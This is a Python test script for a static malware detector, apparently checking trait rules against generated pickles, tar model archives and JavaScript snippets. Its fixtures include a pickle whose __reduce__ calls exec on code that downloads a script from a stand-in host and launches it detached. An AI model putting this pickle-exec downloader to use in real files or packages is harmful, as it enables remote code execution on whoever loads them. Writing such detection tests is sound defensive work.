"""Static controls: produce pickles, never deserialize or execute their source."""
import builtins
import io
import json
import os
from pathlib import Path
import pickle
import subprocess
import tarfile
import tempfile

ROOT = Path(__file__).resolve().parents[2]
RULE = 'objectives/execution/interpreter/pickle::exec-shell-downloader'
MODEL = 'objectives/execution/payload/file-exec::pickle-downloaded-script-detached-launch'
GLOBAL = 'metadata/import/builtin::pickle-builtins-exec'
TIMING = 'micro-behaviors/time/timing/check::browser-storage-day-threshold-timer'
OLD_TIMING = 'objectives/anti-analysis/timing/delay::persisted-first-run-delayed-arming'

class Reducer:
    def __init__(self, source):
        self.source = source

    def __reduce__(self):
        return builtins.exec, (self.source,)

source = '''import os
os.system('python3 -c \\'import urllib.request,subprocess;d="/tmp";urllib.request.urlretrieve("https://example.invalid/stage.py",d+"/stage.py");subprocess.Popen(["setsid","python3",d+"/stage.py"])\\'')
'''

with tempfile.TemporaryDirectory(prefix='pickle-controls-') as tmp:
    tmp = Path(tmp)
    payload = pickle.dumps(Reducer(source), protocol=4)
    cases = {
        'renamed.pkl': (payload, {RULE, MODEL, GLOBAL}, set()),
        'long-source.pkl': (pickle.dumps(Reducer('# padding\n' * 40 + source), protocol=4), {RULE, MODEL, GLOBAL}, set()),
        'protocol5.pkl': (pickle.dumps(Reducer(source), protocol=5), {RULE, MODEL, GLOBAL}, set()),
        'different-path.pkl': (pickle.dumps(Reducer(source.replace('d+"/stage.py"])', 'd+"/other.py"])'))), {RULE, GLOBAL}, {MODEL}),
        'unrelated-exec.pkl': (pickle.dumps({'exec': Reducer('answer = 42'), 'source': source}), {GLOBAL}, {RULE, MODEL}),
        'exec-reference.pkl': (pickle.dumps({'exec': builtins.exec, 'source': source}), {GLOBAL}, {RULE, MODEL}),
        'unused-launch.pkl': (pickle.dumps({'exec': Reducer(source.replace(';subprocess.Popen(["setsid","python3",d+"/stage.py"])', '')), 'unused': source}), {RULE, GLOBAL}, {MODEL}),
        'source-data.pkl': (pickle.dumps({'source': source}), set(), {RULE, MODEL, GLOBAL}),
        'exec-only.pkl': (pickle.dumps(Reducer('answer = 42')), {GLOBAL}, {RULE, MODEL}),
        'no-network.pkl': (pickle.dumps(Reducer("import os;os.system('python3 -c \\\"print(42)\\\"')")), {GLOBAL}, {RULE, MODEL}),
    }
    for name, is_payload, complete in [('model.tar', True, True), ('ordinary.tar', False, True), ('missing-member.tar', True, False)]:
        stream = io.BytesIO()
        with tarfile.open(fileobj=stream, mode='w') as archive:
            members = {'storages': pickle.dumps(0) + pickle.dumps([]), 'pickle': payload if is_payload else pickle.dumps({'weight': 1})}
            if complete:
                members['tensors'] = pickle.dumps(0) + pickle.dumps([])
            for member, data in members.items():
                header = tarfile.TarInfo(member)
                header.size = len(data)
                archive.addfile(header, io.BytesIO(data))
        cases[name] = (stream.getvalue(), ({RULE, MODEL} if is_payload else set()), ({RULE, MODEL} if not is_payload else set()))
    trial = '''const t=localStorage.getItem("trial-start");
if(t){if((new Date().getTime()-Date.parse(t))/864e5>3){setTimeout(showReminder,500)}}
else{localStorage.setItem("trial-start",`${new Date()}`)}
'''
    cases['trial.js'] = (trial.encode(), {TIMING}, {OLD_TIMING})
    cases['storage-only.js'] = (b'localStorage.setItem("x",localStorage.getItem("y"));setTimeout(render,500);', set(), {TIMING, OLD_TIMING})
    for name, (data, _, _) in cases.items():
        (tmp/name).write_bytes(data)
    result = subprocess.run([os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT), '--format', 'json', *[str(tmp/name) for name in cases]], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr + result.stdout
    report = {'files': []}
    decoder = json.JSONDecoder()
    remaining = result.stdout.lstrip()
    while remaining:
        part, end = decoder.raw_decode(remaining)
        report['files'].extend(part['files'])
        remaining = remaining[end:].lstrip()
    for name, (_, expected, excluded) in cases.items():
        ids = {t['id'] for f in report['files'] if Path(f['path']).name == name or f['path'].startswith(str(tmp/name) + '!') or f['path'].startswith(str(tmp/name) + '/') for t in f.get('traits', [])}
        assert expected <= ids, (name, 'missing', expected - ids, [(f['path'], [(t['id'], t['crit']) for t in f.get('traits', [])]) for f in report['files'] if f['path'].startswith(str(tmp/name))])
        assert not excluded & ids, (name, 'unexpected', excluded & ids)
        if name in ['exec-only.pkl', 'source-data.pkl', 'no-network.pkl', 'ordinary.tar', 'unrelated-exec.pkl', 'exec-reference.pkl']:
            high = [t for f in report['files'] if f['path'].startswith(str(tmp/name)) for t in f.get('traits', []) if t['crit'] >= 4]
            assert not high, (name, high)
        print('PASS', name)
